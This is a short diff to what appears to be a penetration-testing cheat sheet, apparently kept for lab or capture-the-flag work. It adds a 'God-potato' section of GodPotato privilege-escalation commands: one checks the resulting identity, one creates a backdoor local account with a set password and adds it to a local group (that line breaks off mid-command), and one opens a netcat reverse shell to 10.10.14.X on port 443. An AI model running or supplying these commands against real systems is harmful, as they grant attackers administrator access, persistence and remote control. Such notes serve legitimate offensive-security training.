@@ -51,7 +51,9 @@ wpscan --url http://$ip -e u,vp,vt | tee wpscandeep
 
 ### God-potato
 ```bash
-
+GodPotato-NET4.exe -cmd "cmd /c whoami"
+GodPotato-NET4.exe -cmd "cmd /c net user pwn P@ssw0rd123 /add && net localgroup
+GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe 10.10.14.X 443 -e cmd.exe"
 ```
 
 ### NXC
